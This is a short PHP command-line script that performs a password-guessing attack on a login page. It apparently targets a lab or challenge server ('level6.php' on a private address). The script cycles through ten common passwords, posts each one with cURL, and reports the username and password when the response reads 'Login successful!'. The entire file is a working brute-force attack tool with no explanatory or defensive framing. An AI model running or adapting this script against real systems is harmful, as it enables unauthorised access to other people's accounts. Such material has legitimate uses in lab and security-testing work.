<?php
// Function to perform the attack
function performAttack($username) {
    $target_url = "http://10.57.72.79:8000/level6.php";
    $passwords = [
        "password123", "password", "admin", "welcome", "12345678",
        "qwerty", "abc123", "letmein", "monkey", "football"
    ];
    foreach ($passwords as $password) {
        $post_data = [
            'password' => $password //
        ];
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $target_url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($post_data));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 20);
        $response = curl_exec($ch);
        $error = curl_error($ch);
        curl_close($ch);
        // Debugging Output
        echo "Trying password: $password\n";
        if ($error) {
            echo "cURL Error: $error\n";
            break;
        }
        if (strpos($response, "Login successful!") !== false) {
            echo "Success! Username: $username, Password: $password\n";
            return true; // Exit the function on success
        }
    }
    echo "Attack failed. No password matched.\n";
    return false;
}
// Check if running from the command line
if (php_sapi_name() === 'cli') {
    // Get the username from the command line
    if ($argc < 2) {
        die("Usage: php attack.php <username>\n");
    }
    $username = $argv[1];
    performAttack($username);
} else {
    // If included in another script, assume the username is passed as a parameter
    if (isset($username)) {
        performAttack($username);
    } else {
        echo "Username not provided!\n";
    }
}
?>